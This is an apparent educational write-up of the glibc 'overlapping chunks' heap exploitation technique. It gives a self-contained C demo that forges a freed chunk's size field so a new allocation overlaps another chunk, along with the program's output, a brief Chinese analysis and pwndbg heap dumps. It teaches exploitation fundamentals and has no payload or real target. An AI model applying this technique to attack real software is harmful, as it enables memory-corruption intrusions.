# overlapping_chunks

```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){


	intptr_t *p1,*p2,*p3,*p4;

	fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n");
	fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n");

	p1 = malloc(0x100 - 8);
	p2 = malloc(0x100 - 8);
	p3 = malloc(0x80 - 8);

	fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x100 - 8);
	memset(p2, '2', 0x100 - 8);
	memset(p3, '3', 0x80 - 8);

	fprintf(stderr, "\nNow let's free the chunk p2\n");
	free(p2);
	fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
		" however, it is best to maintain the stability of the heap.\n");
	fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
		" to assure that p1 is not mistaken for a free chunk.\n");

	int evil_chunk_size = 0x181;
	int evil_region_size = 0x180 - 8;
	fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2

	fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	fprintf(stderr, "p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
	fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");

	fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	fprintf(stderr, "Let's run through an example. Right now, we have:\n");
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

**result**

```c
This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x1311010
p2=0x1311110
p3=0x1311210

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376

Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x1311110 and ends at 0x1311288
p3 starts at 0x1311210 and ends at 0x1311288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = x;W��
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4, '4', 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3, '3', 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
```

**analysis**

首先申请三个chunk，p1，p2，p3。然后free(p2)，p2会被加入到unsorted bin中。我们假设溢出p1，将p2的size修改为0x181。然后malloc(0x180-8)，这时得到的p4包含了p3。

**gdb**

申请三个chunk

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x603100
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x603200
Size: 0x81

Top chunk | PREV_INUSE
Addr: 0x603280
Size: 0x20d81
```

free(p2) and overwrite it's size，可以发现p3已经没有了，因为p3被包含在了p4中，但是我们还可以获得p3的内存空间。

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603100
Size: 0x181
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Top chunk | PREV_INUSE
Addr: 0x603280
Size: 0x20d81
```

申请p4

```c
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x603100
Size: 0x181

Top chunk | PREV_INUSE
Addr: 0x603280
Size: 0x20d81
```

查看内存

```c
0x603000	0x0000000000000000	0x0000000000000101	................
0x603010	0x3131313131313131	0x3131313131313131	1111111111111111
0x603020	0x3131313131313131	0x3131313131313131	1111111111111111
0x603030	0x3131313131313131	0x3131313131313131	1111111111111111
0x603040	0x3131313131313131	0x3131313131313131	1111111111111111
0x603050	0x3131313131313131	0x3131313131313131	1111111111111111
0x603060	0x3131313131313131	0x3131313131313131	1111111111111111
0x603070	0x3131313131313131	0x3131313131313131	1111111111111111
0x603080	0x3131313131313131	0x3131313131313131	1111111111111111
0x603090	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030a0	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030b0	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030c0	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030d0	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030e0	0x3131313131313131	0x3131313131313131	1111111111111111
0x6030f0	0x3131313131313131	0x3131313131313131	1111111111111111
0x603100	0x3131313131313131	0x0000000000000181	11111111........
0x603110	0x00007ffff7dd1b78	0x00007ffff7dd1b78	x.......x.......
0x603120	0x3232323232323232	0x3232323232323232	2222222222222222
0x603130	0x3232323232323232	0x3232323232323232	2222222222222222
0x603140	0x3232323232323232	0x3232323232323232	2222222222222222
0x603150	0x3232323232323232	0x3232323232323232	2222222222222222
0x603160	0x3232323232323232	0x3232323232323232	2222222222222222
0x603170	0x3232323232323232	0x3232323232323232	2222222222222222
0x603180	0x3232323232323232	0x3232323232323232	2222222222222222
0x603190	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031a0	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031b0	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031c0	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031d0	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031e0	0x3232323232323232	0x3232323232323232	2222222222222222
0x6031f0	0x3232323232323232	0x3232323232323232	2222222222222222
0x603200	0x0000000000000100	0x0000000000000080	................
0x603210	0x3333333333333333	0x3333333333333333	3333333333333333
0x603220	0x3333333333333333	0x3333333333333333	3333333333333333
0x603230	0x3333333333333333	0x3333333333333333	3333333333333333
0x603240	0x3333333333333333	0x3333333333333333	3333333333333333
0x603250	0x3333333333333333	0x3333333333333333	3333333333333333
0x603260	0x3333333333333333	0x3333333333333333	3333333333333333
0x603270	0x3333333333333333	0x3333333333333333	3333333333333333
0x603280	0x3333333333333333	0x0000000000020d81	33333333........	 <-- Top chunk
```

